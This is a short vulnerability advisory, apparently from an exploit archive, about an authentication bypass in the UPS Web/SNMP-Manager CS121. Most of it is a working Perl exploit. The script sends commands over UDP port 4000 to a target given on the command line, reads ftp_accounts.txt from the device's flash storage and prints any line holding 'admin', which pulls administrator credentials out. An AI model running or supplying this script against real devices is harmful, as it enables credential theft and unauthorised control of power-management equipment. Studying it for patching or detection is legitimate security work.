source: http://www.securityfocus.com/bid/67438/info

UPS Web/SNMP-Manager CS121 is prone to an authentication-bypass vulnerability.

Attackers can exploit this issue to bypass authentication mechanism and gain access to the HTTP(s), SNMP or Telnet port service. 

#!/usr/bin/perl -w
use IO::Socket;      
use constant MAXBYTES => scalar 1024;      

$socket = IO::Socket::INET->new( PeerPort  => 4000,
                                 PeerAddr  => $ARGV[0],
                                 Type      => SOCK_DGRAM,
                                 Proto     => 'udp');

$socket->send("<VERSION>");
$socket->recv($inline, MAXBYTES);
print "UPS: $inline \n"; 

$socket->send("show syspar");
$socket->recv($inline, MAXBYTES);
print "$inline\n";

print "Searching login\n" ; 
$socket->send("start");
$socket->recv($inline, MAXBYTES);
$socket->send("cd /flash");
$socket->send("type ftp_accounts.txt"); 

while($socket->recv($inline, MAXBYTES)) { 
	 if($inline =~ /admin/ig) { print $inline; exit;  }
}

sleep(1);
